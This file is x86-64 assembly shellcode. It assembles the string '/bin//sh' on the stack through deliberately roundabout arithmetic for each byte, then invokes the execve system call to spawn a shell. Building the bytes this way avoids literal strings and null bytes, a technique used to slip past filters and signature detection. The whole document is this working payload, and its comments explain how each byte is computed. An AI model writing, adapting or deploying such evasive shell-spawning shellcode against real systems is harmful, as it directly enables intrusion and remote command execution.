section .text
global _start

_start:
    xor eax, eax
    xor ebx, ebx
	sub rsp, 8

	; byte 7 = 'h' = 0x68 = 104
    mov bl, 104
    xchg al, bl     ; swap the value
	mov byte[rsp+7], al        

    ; byte 6 = 's' = 0x73 = 115
    mov al, 5
    mov bl, 3
    imul bl         ; al = 3 x 5
    add al, 100     ; 15 + 100
    mov byte[rsp+6], al

	; byte 5 = '/' = 0x2f = 47
    mov al, 20      ; 20
    add al, 27      ; 20 + 27
    mov byte[rsp+5], al

	; byte 4 = '/' = 0x2f = 47
    mov al, 7       ; 7
    mov bl, 7       ; 7
    imul bl         ; al = 7 * 7
    sub al, 2       ; 49 - 2
    mov byte[rsp+4], al

	; byte 3 = 'n' = 0x6e = 110
    mov al, -100    ; -100
    neg al          ; 100
    add al, 10      ; 100 + 10
    mov byte[rsp+3], al

	; byte 2 = 'i' = 0x69 = 105
    mov al, 210
    mov bl, 2
    idiv bl         ; 210 / 2 = al(quotient) , ah(remainder)
    movzx eax, al   ; replace remainder with zeroes
    mov byte[rsp+2], al

	; byte 1 = 'b' = 0x62 = 98
    mov al, 0x63    ; 99
    dec al          ; 98
    mov byte[rsp+1], al

	; byte 0 = '/' = 0x2f = 47
    mov al, 0x5a    ; 90
    sub al, 0x2b    ; 43
    mov byte[rsp+0], al

	; null terminator
	xor rax, rax
    mov byte[rsp+8], al

    ;execve
	push 59
	pop rax
	mov rdi, rsp
	xor esi, esi
	xor edx, edx
	syscall
